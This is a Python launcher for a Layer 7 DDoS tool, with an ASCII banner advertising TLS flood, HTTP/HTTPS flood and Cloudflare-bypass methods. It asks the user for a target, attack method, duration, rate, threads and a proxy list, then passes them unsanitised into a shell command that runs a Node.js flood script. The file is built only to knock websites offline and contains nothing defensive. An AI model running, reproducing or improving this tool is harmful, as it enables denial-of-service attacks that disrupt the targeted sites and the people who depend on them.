import subprocess
import subprocess
import os
import requests,os,time,re,json,uuid,random,sys
from concurrent.futures import ThreadPoolExecutor
import requests
import time
import colorama
import threading 
import aiohttp
import asyncio
import subprocess
import multiprocess
import sys
import time
from time import sleep
from pystyle import *
import os
osystem = sys.platform

if osystem == "linux":
  os.system("clear")
else:
  os.system("cls")
  
time.sleep(1)
ascii = r'''
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ┣>Owner : nminh2302
⣿⣿⣿⣿⣿⣿⠿⢋⡘⠿⣿⣿⠿⠟⣛⣛⣛⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ┣>Plan : Vip
⣿⣿⣿⣿⣿⣿⣿⣧⣰⡿⢋⣵⣾⣿⣿⣿⣿⣿⣿⣷⣦⣙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ┣>Tool Ddos Layer 7!!!
⣿⣿⣿⣿⣿⣿⣿⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠉⠭⠉⣙⠛⠿⣿⣿ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
⣿⣿⣿⣿⣿⣿⡿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠠⣍⢳⣦⡙⣷⡘⣿ ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓       
⣿⣿⣿⠟⡋⢁⡠⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⢋⡼⢟⣴⠟⣴⣿ ┣>Methods Ddos Attack
⣯⣿⣡⠎⣴⡏⣾⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⣛⡩⠴⢚⡩⠔⣫⣴⣿⣿⣿ ┣>TLS & TLS-FLOOD
⣷⣟⢿⣆⡛⠷⠦⣥⣉⣛⣛⣛⣋⣉⠭⠭⠥⠖⣒⡊⠭⠄⣒⡩⣰⣾⡿⠿⣿⣿⣿⣿ ┣>HTTP & HTTPS
⣟⣿⣷⣬⣭⣙⣒⣒⣒⠒⣒⣒⣒⣒⣀⣬⣭⣤⣶⣶⣿⣿⠟⣰⣿⣿⣧⣡⣿⣿⣿⣿ ┣>DESTROY & GOD & CF-BYPASS
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣬⡛⠿⣿⣿⣿⣿⣿⣿⠿⢛⣡⣾⣿⠏⠹⣿⣿⣿⣿⣿⣿ ┣>Meow Meow Meow Meow Trả Lại Tâm Trí Tôi Đâyyyy=)))
⣿⣿⣿⣿⣿⣧⣀⣿⣿⣿⣿⣿⣷⣶⣦⣭⣭⣤⣶⣾⣿⣿⣿⣶⡌⢡⣶⣿⣿⣿⣿⣿ ┣>Note : Don't attack websites that block ip and state
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 '''




banner = r"""
""".replace('▓', '▀')


banner = Add.Add(ascii, banner, center=True)

 

 
print(Colorate.Horizontal(Colors.red_to_blue, banner))
def execute_command(method,target, time, request, thread, proxy_file):
    command = f'node {method}.js {target} {time} {request} {thread} {proxy_file}'
    subprocess.call(command, shell=True)

# Hàm main để lấy thông tin từ người dùng và gọi hàm execute_command
def main():
    target = input("\033[1;91mTarget: ")
    method = input("\033[1;91mMethods: ")
    time = input("\033[1;91mTime: ")
    request = input("\033[1;91mRate: ")
    thread = input("\033[1;91mThreads: ")
    proxy_file = input("\033[1;91mProxy: ")
    print("\033[1;91mSent Attack Succesfully....")
    execute_command(method,target, time, request, thread, proxy_file)

# Gọi hàm main để chạy công cụ
if __name__ == "__main__":
    main()
